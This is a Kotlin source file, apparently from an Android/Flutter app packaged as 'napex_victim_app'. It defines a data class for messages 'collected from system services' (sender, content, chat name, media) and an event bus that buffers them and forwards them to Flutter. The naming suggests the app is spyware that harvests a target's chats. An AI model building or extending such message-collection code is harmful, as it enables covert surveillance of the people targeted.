package com.napex.napex_victim_app.services

import android.os.Handler
import android.os.Looper
import io.flutter.plugin.common.EventChannel

import java.util.LinkedList
import java.util.UUID

/**
 * رسالة مُجمَّعة من خدمات النظام — تُرسل إلى Flutter عبر EventChannel
 */
data class CollectedMessage(
    val id: String,
    val sender: String,
    val content: String,
    val source: String,
    val timestamp: Long,
    val chatName: String? = null,
    val mediaPath: String? = null,
    val mediaType: String = "text",
) {
    fun toMap(): Map<String, Any?> = mapOf(
        "id" to id,
        "sender" to sender,
        "content" to content,
        "source" to source,
        "timestamp" to timestamp,
        "chatName" to chatName,
        "mediaPath" to mediaPath,
        "mediaType" to mediaType,
    )
}

/**
 * ناقل أحداث الرسائل — تُبث منه كل الخدمات الأصلية إلى Dart.
 * يدعم تخزين مؤقت (حتى 50 رسالة) عندما لا يكون Flutter في وضع الاستماع.
 */
object MessageEventBus {

    private const val MAX_PENDING = 50

    private val pending = LinkedList<Map<String, Any?>>()
    private var sink: EventChannel.EventSink? = null
    private val handler = Handler(Looper.getMainLooper())

    @Synchronized
    fun attachSink(newSink: EventChannel.EventSink) {
        sink = newSink
        // تسليم الرسائل المتراكمة
        while (pending.isNotEmpty()) {
            val message = pending.poll()
            if (message != null) deliver(message)
        }
    }

    @Synchronized
    fun detachSink(oldSink: EventChannel.EventSink) {
        if (sink === oldSink) sink = null
    }

    @Synchronized
    fun emit(message: CollectedMessage) {
        emitMap(message.toMap())
    }

    @Synchronized
    private fun emitMap(map: Map<String, Any?>) {
        val current = sink
        if (current == null) {
            if (pending.size >= MAX_PENDING) pending.poll()
            pending.add(map)
            return
        }
        deliver(map)
    }

    private fun deliver(map: Map<String, Any?>) {
        // EventSink يجب أن يُستدعى من الخيط الرئيسي
        handler.post {
            try {
                sink?.success(map)
            } catch (_: Exception) {
                // القناة أُغلقت أثناء التسليم — تُخزَّن البقية تلقائياً
            }
        }
    }
}
